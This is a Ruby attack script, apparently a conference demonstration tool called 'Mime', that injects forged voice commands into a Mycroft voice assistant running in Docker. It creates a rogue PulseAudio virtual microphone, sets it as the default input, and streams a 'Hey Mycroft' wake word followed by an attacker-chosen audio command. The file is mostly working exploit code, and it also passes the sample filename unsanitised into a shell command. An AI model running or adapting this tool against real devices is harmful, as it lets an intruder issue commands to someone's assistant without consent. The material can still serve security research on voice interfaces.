#!/usr/bin/ruby
require 'colorize'
require 'docker-api'
$docker_socket = "unix:///var/run/docker.sock"
$mycroft_container_name = "mycroft"

def banner()
    system("clear")
    puts "Mime - v1.0".colorize(:color => :black, :background => :light_white)
    puts "\t@mauroeldritch @ DC5411 - 2020\n".colorize(:color => :light_white, :background => :black)
end

def help()
    puts "Usage:   ./mime.rb [voice_sample]\nExample: ./mime.rb What_Is_Plutonium.ogg\n".light_cyan
end

def check()
    pactl = `which pactl`.chomp()
    ffmpeg = `which ffmpeg`.chomp()
    pulseaudio = `which pulseaudio`.chomp()
    if pactl.to_s.empty?
        puts "[!] Fatal: Couldn't find required dependency: pactl binary.".light_red
        exit(1)
    else
        puts "[*] Found pactl: #{pactl}.".light_green
    end
    if ffmpeg.to_s.empty?
        puts "[!] Fatal: Couldn't find required dependency: ffmpeg binary.".light_red
        exit(1)
    else
        puts "[*] Found ffmpeg: #{ffmpeg}.".light_green
    end
    if pulseaudio.to_s.empty?
        puts "[!] Fatal: Couldn't find required dependency: pulseaudio binary.".light_red
        exit(1)
    else
        puts "[*] Found pulseaudio: #{pulseaudio}.".light_green
    end
    begin
        Docker.url = $mime_socket
        v = Docker.version["Version"]
        puts "[*] Found Docker v#{v}.".light_green
    rescue
        puts "[!] Fatal: Couldn't reach Docker. Make sure Docker is running and you have privileges to query it.".light_red
        exit(1)
    end
    begin
        mycroft = Docker::Container.get($mycroft_container_name).json["State"]
        status = mycroft["Status"]
        pid = mycroft["Pid"]
        if status == "running"
            puts "[*] Found Mycroft instance #{status} with PID #{pid}.".light_green
        elsif status == "exited" || status == "paused"
            puts "[*] Found Mycroft instance, but is not running (Status: #{status}). Starting it...".light_blue
            Docker::Container.get($mycroft_container_name).start
        end
    rescue
        puts "[!] Fatal: Couldn't find Mycroft container.".red
        exit(1)
    end
    samples = Dir[File.join("./samples", '**', '*')].count { |file| File.file?(file) }
    if samples.to_i > 0
        puts "[*] Found #{samples} voice samples.".light_green
    else
        puts "[!] Fatal: no voice samples found.".light_red
        exit(1)
    end
end

def exploit(sample)
    if !File.file?("samples/#{sample}")
        puts "[!] Fatal: voice sample could not be found.".light_red
        exit(1)
    end
    begin
        puts "\n[*] Starting Mime Attack...\n[*] Creating rogue Virtual Mic...".light_cyan
        virtmicid = `pactl load-module module-pipe-source source_name=virtmic file=/tmp/virtmic format=s16le rate=16000 channels=1`
        puts "[*] Virtual Mic #{virtmicid.chomp()} created. Setting it as default...".light_cyan
        virtmicdefault = `pactl set-default-source virtmic`
        puts "[*] Sending crafted alert: Hey Mycroft!...".light_cyan
        send_alert = `ffmpeg -loglevel quiet -re -i ./samples/Hey_Mycroft.ogg -f s16le -ar 16000 -ac 1 - > /tmp/virtmic`
        sleep 5
        parsed_sample = "" + sample
        puts "[*] Sending crafted message: #{parsed_sample.gsub!("_", " ")}?".light_cyan
        `ffmpeg -loglevel quiet -re -i ./samples/#{sample} -f s16le -ar 16000 -ac 1 - > /tmp/virtmic`
        sleep 3
    rescue => error
        puts "[*] Fatal: Could not exploit target: #{error.to_s}.".light_red
    ensure
        puts "[*] Removing the Virtual Mic and configs...".light_cyan
        virtmicrm = `pactl unload-module module-pipe-source`
    end
end

banner()
if ARGV.count != 1
    help()
else
    check()
    exploit(ARGV[0])
end